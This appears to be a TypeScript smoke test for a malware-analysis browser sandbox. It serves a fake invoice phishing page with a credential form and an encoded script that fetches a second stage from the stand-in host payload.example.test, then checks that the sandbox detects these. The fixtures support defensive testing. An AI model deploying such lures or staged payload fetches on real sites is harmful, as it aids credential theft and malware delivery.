import assert from 'node:assert/strict'
import { existsSync } from 'node:fs'
import http from 'node:http'
import type { AddressInfo } from 'node:net'
import WebSocket, { WebSocketServer } from 'ws'
import { chromium } from 'playwright'
import { handleOnionSessionSocket } from '../src/handlers/onionSession/ws.ts'

type BrokerPayload = {
    type?: string
    state?: string
    reason?: string
    url?: string
    target?: string
    title?: string
    image?: string | null
    width?: number
    height?: number
    frameQuality?: { looksBlank?: boolean; visibleTextLength?: number; elementCount?: number }
    torProxyConfigured?: boolean
    evidence?: {
        textExcerpt?: string
        verdict?: string
        reasons?: string[]
        indicators?: { domains?: string[]; ips?: string[]; urls?: string[] }
        obfuscatedScripts?: unknown[]
        deobfuscationTasks?: Array<{
            assessment?: string
            summary?: string
            decodedPreview?: string
            indicators?: { domains?: string[]; ips?: string[]; urls?: string[] }
        }>
        threatAssociations?: Array<{ name?: string; category?: string; source?: string }>
    }
    toolAnalysis?: {
        toolKind?: string
        vendorFlagged?: number
        vendorTotal?: number
        alertCount?: number
        communityCommentCount?: number
        extractedSignals?: string[]
    }
    webcrackLoad?: {
        loaded?: boolean
        sampleBytes?: number
        reason?: string
    }
    networkSummary?: {
        recentRequests?: Array<{ method?: string; resourceType?: string; status?: number; host?: string; mimeType?: string; initiator?: string; durationMs?: number; url?: string; asn?: string }>
        downloads?: Array<{ url?: string; fileName?: string; bytes?: number; sha256?: string; hashStatus?: string }>
    }
    receivedAt?: number
}

process.env.BROWSER_SANDBOX_ALLOW_LOCAL_TARGETS = '1'
const playwrightChromium = chromium.executablePath()
if (!process.env.CHROMIUM_BIN && existsSync(playwrightChromium)) process.env.CHROMIUM_BIN = playwrightChromium

const payloadDomain = 'payload.example.test'
const downloadBody = 'sandbox download hash fixture\n'
const downloadHash = '93389713f66d8ccf6a7968f98a05ad61b3f9bf02667bfd499b9300fa0bb25569'
const encoded = Buffer.from(`fetch("https://${payloadDomain}/stage2"); document.body.insertAdjacentHTML("beforeend", "<p>LockBit payload</p>");`).toString('base64')
const pages = new Map<string, string>([
    ['/start', `<!doctype html>
<html><head><title>Initial suspicious page</title></head>
<body>
  <main>
    <h1>Acme invoice verification</h1>
    <p>LockBit ransomware campaign associated with this lure.</p>
    <p>Benign API text: document.createElement object.assign el.style should not become copied indicators.</p>
    <button id="click-proof" style="position:fixed;left:20px;top:20px;width:220px;height:54px;z-index:2" onclick="document.title='Interactive click received';document.getElementById('interaction-proof').textContent='Interactive click received'">Confirm invoice</button>
    <input id="type-proof" style="position:fixed;left:20px;top:88px;width:220px;height:40px;z-index:2" oninput="document.title='Typed proof: ' + this.value;document.getElementById('type-result').textContent='Typed proof: ' + this.value">
    <a id="download-proof" href="/payload.bin" download="invoice-payload.bin" style="position:fixed;left:20px;top:140px;width:220px;height:40px;z-index:2">Download invoice payload</a>
    <p id="interaction-proof" style="margin-top:140px">Interaction pending</p>
    <p id="type-result">Typed proof pending</p>
    <form action="https://credential.example.test/login"><input name="email"><input name="password" type="password"></form>
  </main>
  <script type="text/plain">eval(atob("${encoded}"));</script>
  <script>setTimeout(() => { location.href = "/final" }, 10000)</script>
</body></html>`],
    ['/final', `<!doctype html>
<html><head><title>Final redirect page</title></head>
<body><main><h1>Final landing</h1><p>Redirect complete after staged invoice lure.</p></main></body></html>`],
    ['/virustotal', `<!doctype html>
<html><head><title>VirusTotal fixture</title></head>
<body><main><h1>VirusTotal</h1><p>12/94 security vendors flagged this URL as malicious.</p><p>3 community comments mention LockBit and credential theft.</p></main></body></html>`],
    ['/urlquery', `<!doctype html>
<html><head><title>urlquery fixture</title></head>
<body><main><h1>urlquery.net</h1><p>4 alerts were raised for malicious requests.</p><p>2 community comments mention suspicious redirect chains.</p></main></body></html>`],
    ['/webcrack', `<!doctype html>
<html><head><title>WebCrack fixture</title></head>
<body><main><h1>WebCrack</h1><textarea aria-label="source"></textarea><button>Run</button><pre id="out"></pre></main>
<script>
document.querySelector('button').addEventListener('click', () => {
  document.getElementById('out').textContent = document.querySelector('textarea').value
})
</script></body></html>`],
])

const httpServer = http.createServer((request, response) => {
    const url = new URL(request.url || '/', 'http://127.0.0.1')
    if (url.pathname === '/payload.bin') {
        response.writeHead(200, {
            'content-type': 'application/octet-stream',
            'content-disposition': 'attachment; filename="invoice-payload.bin"',
            'cache-control': 'no-store',
        })
        response.end(downloadBody)
        return
    }
    const body = pages.get(url.pathname) || pages.get('/start') || ''
    response.writeHead(200, {
        'content-type': 'text/html; charset=utf-8',
        'cache-control': 'no-store',
    })
    response.end(body)
})

await listen(httpServer)
const httpPort = portFor(httpServer)
const base = `http://127.0.0.1:${httpPort}`
const target = `${base}/start`

const wsServer = new WebSocketServer({ host: '127.0.0.1', port: 0 })
await onceListening(wsServer)
const wsPort = portFor(wsServer)

wsServer.on('connection', (connection) => {
    handleOnionSessionSocket(connection, `browser-sandbox-smoke-${Date.now().toString(36)}`, 'regular')
})

const client = new WebSocket(`ws://127.0.0.1:${wsPort}`)
const payloads: BrokerPayload[] = []

client.on('message', (message) => {
    try {
        payloads.push({ ...JSON.parse(message.toString()) as BrokerPayload, receivedAt: Date.now() })
    } catch {
        payloads.push({ type: 'unparseable', receivedAt: Date.now() })
    }
})

await onceOpen(client)
client.send(JSON.stringify({
    type: 'start',
    target,
    durationMinutes: 1,
    width: 960,
    height: 640,
    profileTools: [
        { id: 'virustotal', name: 'VirusTotal', url: `${base}/virustotal?url={url}` },
        { id: 'urlquery', name: 'urlquery', url: `${base}/urlquery?q={url}` },
        { id: 'webcrack', name: 'WebCrack', url: `${base}/webcrack` },
    ],
}))

await waitForPayload(payloads, payload => payload.type === 'ready')
await waitForPayload(payloads, payload => payload.type === 'frame' && Boolean(payload.image) && payload.url?.endsWith('/start'))
client.send(JSON.stringify({ type: 'click', x: 80, y: 48, button: 0 }))
await waitForPayload(payloads, payload => payload.type === 'frame' && payload.title === 'Interactive click received', 8_000)
client.send(JSON.stringify({ type: 'click', x: 80, y: 108, button: 0 }))
for (const key of 'abc') client.send(JSON.stringify({ type: 'key', key }))
await waitForPayload(payloads, payload => payload.type === 'frame' && payload.title === 'Typed proof: abc', 8_000)
client.send(JSON.stringify({ type: 'click', x: 80, y: 155, button: 0 }))
await waitForPayload(payloads, payload => payload.type === 'status' && payload.state === 'download_blocked', 8_000)
await waitForPayload(payloads, payload => payload.type === 'frame' && payload.url?.endsWith('/final'), 25_000)
await waitForPayload(payloads, payload => payload.type === 'tool_capture' && payload.toolAnalysis?.toolKind === 'virustotal' && payload.toolAnalysis.vendorFlagged !== undefined)
await waitForPayload(payloads, payload => payload.type === 'tool_capture' && payload.toolAnalysis?.toolKind === 'urlquery' && payload.toolAnalysis.alertCount !== undefined)
await waitForPayload(payloads, payload => payload.type === 'tool_capture' && payload.toolAnalysis?.toolKind === 'webcrack' && payload.webcrackLoad?.loaded === true)

const ready = payloads.find(payload => payload.type === 'ready')
assert.equal(ready?.torProxyConfigured, false, 'regular browser sandbox should not use the Tor proxy')

const pageFrames = payloads.filter(payload => payload.type === 'frame')
assert(pageFrames.some(payload => payload.reason === 'domcontentloaded'), 'captures DOM-ready browser state')
assert(pageFrames.some(payload => payload.reason === 'load'), 'captures loaded browser state')
assert(pageFrames.every(payload => !payload.width || payload.height === Math.round(payload.width * 9 / 16)), 'browser frames stay 16:9')
assert(pageFrames.some(payload => payload.url?.endsWith('/start')), 'captures initial URL before redirect')
assert(pageFrames.some(payload => payload.url?.endsWith('/final')), 'captures final URL after redirect')
assert(pageFrames.some(payload => (payload.image || '').length > 1000), 'captures non-empty screenshots')
assert(pageFrames.some(payload => payload.frameQuality?.looksBlank === false && (payload.frameQuality.visibleTextLength || 0) > 20 && (payload.frameQuality.elementCount || 0) > 5), 'captures rendered non-blank frame quality metadata')
assert(pageFrames.some(payload => payload.networkSummary?.recentRequests?.some(request => request.status === 200 && request.method === 'GET' && request.host === '127.0.0.1' && request.mimeType?.includes('text/html') && request.durationMs !== undefined && request.initiator)), 'exposes analyst-grade network request columns')
assert(pageFrames.some(payload => payload.networkSummary?.downloads?.some(download => download.fileName === 'invoice-payload.bin' && download.bytes === downloadBody.length && download.sha256 === downloadHash && download.hashStatus === 'hashed_and_deleted')), 'hashes downloaded files and reports deletion status')

const initialEvidence = pageFrames.find(payload => payload.url?.endsWith('/start') && payload.evidence?.obfuscatedScripts?.length)?.evidence
const evidenceIndicators = pageFrames.flatMap(payload => [
    ...(payload.evidence?.indicators?.domains || []),
    ...(payload.evidence?.indicators?.ips || []),
    ...(payload.evidence?.indicators?.urls || []),
]).map(item => item.toLowerCase())
assert(!evidenceIndicators.includes('document.createelement') && !evidenceIndicators.includes('object.assign') && !evidenceIndicators.includes('el.style'), 'does not promote generic DOM/API strings to indicators')
assert(initialEvidence?.obfuscatedScripts?.length, 'extracts obfuscated script candidates')
assert(initialEvidence?.deobfuscationTasks?.some(task => task.assessment === 'suspicious'), 'summarizes suspicious decoded script')
assert(initialEvidence?.deobfuscationTasks?.some(task => task.indicators?.domains?.includes(payloadDomain)), 'decoded script exposes second-stage domain')
assert(initialEvidence?.threatAssociations?.some(item => item.name === 'LockBit'), 'extracts actor/malware context from rendered evidence')
assert(initialEvidence?.indicators?.domains?.includes('credential.example.test'), 'extracts form-action domain indicators')

const vt = payloads.find(payload => payload.type === 'tool_capture' && payload.toolAnalysis?.toolKind === 'virustotal' && payload.toolAnalysis.vendorFlagged !== undefined)
assert.equal(vt?.toolAnalysis?.vendorFlagged, 12)
assert.equal(vt?.toolAnalysis?.vendorTotal, 94)
assert.equal(vt?.toolAnalysis?.communityCommentCount, 3)
assert((vt?.image || '').length > 1000, 'VirusTotal parsed capture includes a screenshot')

const urlquery = payloads.find(payload => payload.type === 'tool_capture' && payload.toolAnalysis?.toolKind === 'urlquery' && payload.toolAnalysis.alertCount !== undefined)
assert.equal(urlquery?.toolAnalysis?.alertCount, 4)
assert.equal(urlquery?.toolAnalysis?.communityCommentCount, 2)
assert((urlquery?.image || '').length > 1000, 'urlquery parsed capture includes a screenshot')
assert(!urlquery?.evidence?.comments?.some(comment => /<[^>]+>/.test(comment)), 'provider comments do not leak raw HTML into analyst summaries')

const webcrack = payloads.find(payload => payload.type === 'tool_capture' && payload.toolAnalysis?.toolKind === 'webcrack' && payload.webcrackLoad?.loaded === true)
assert.equal(webcrack?.webcrackLoad?.loaded, true)
assert((webcrack?.webcrackLoad?.sampleBytes || 0) > 40, 'loads extracted obfuscated sample into WebCrack fixture')
assert((webcrack?.image || '').length > 1000, 'WebCrack capture includes a screenshot')
for (const capture of [vt, urlquery, webcrack]) {
    assert(capture?.receivedAt && ready?.receivedAt && capture.receivedAt - ready.receivedAt <= 25_000, `${capture?.toolAnalysis?.toolKind || 'provider'} loaded within the provider smoke budget after browser ready`)
}

client.send(JSON.stringify({ type: 'end' }))
await waitForPayload(payloads, payload => payload.type === 'ended')
client.close()
wsServer.close()
httpServer.close()

console.log(JSON.stringify({
    ok: true,
    target,
    pageUrls: Array.from(new Set(pageFrames.map(payload => payload.url).filter(Boolean))),
    pageCaptureCount: pageFrames.length,
    toolCaptures: payloads.filter(payload => payload.type === 'tool_capture').map(payload => payload.toolAnalysis?.toolKind),
}, null, 2))
process.exit(0)

function listen(server: http.Server) {
    return new Promise<void>((resolve, reject) => {
        server.once('error', reject)
        server.listen(0, '127.0.0.1', () => resolve())
    })
}

function onceListening(server: WebSocketServer) {
    return new Promise<void>((resolve) => {
        if (server.address()) {
            resolve()
            return
        }
        server.once('listening', () => resolve())
    })
}

function onceOpen(socket: WebSocket) {
    return new Promise<void>((resolve, reject) => {
        socket.once('open', () => resolve())
        socket.once('error', reject)
    })
}

function portFor(server: http.Server | WebSocketServer) {
    const address = server.address()
    assert(address && typeof address !== 'string')
    return (address as AddressInfo).port
}

function waitForPayload(payloads: BrokerPayload[], predicate: (payload: BrokerPayload) => boolean, timeoutMs = 20_000) {
    const started = Date.now()

    return new Promise<BrokerPayload>((resolve, reject) => {
        const timer = setInterval(() => {
            const match = payloads.find(predicate)
            if (match) {
                clearInterval(timer)
                resolve(match)
                return
            }

            if (Date.now() - started > timeoutMs) {
                clearInterval(timer)
                reject(new Error(`Timed out waiting for browser sandbox payload. Received: ${JSON.stringify(payloads.slice(-10).map(summarizePayload))}`))
            }
        }, 50)
    })
}

function summarizePayload(payload: BrokerPayload) {
    if (payload.type === 'tool_capture') {
        return {
            type: payload.type,
            id: payload.id,
            url: payload.url,
            imageBytes: payload.image?.length || 0,
            toolAnalysis: payload.toolAnalysis,
            webcrackLoad: payload.webcrackLoad,
            evidence: payload.evidence ? {
                verdict: payload.evidence.verdict,
                reasons: payload.evidence.reasons,
                obfuscatedScripts: payload.evidence.obfuscatedScripts?.length,
            } : undefined,
        }
    }
    if (payload.type !== 'frame') return payload
    return {
        type: payload.type,
        reason: payload.reason,
        url: payload.url,
        title: payload.title,
        imageBytes: payload.image?.length || 0,
        evidence: payload.evidence ? {
            verdict: payload.evidence.verdict,
            reasons: payload.evidence.reasons,
            obfuscatedScripts: payload.evidence.obfuscatedScripts?.length,
        } : undefined,
    }
}
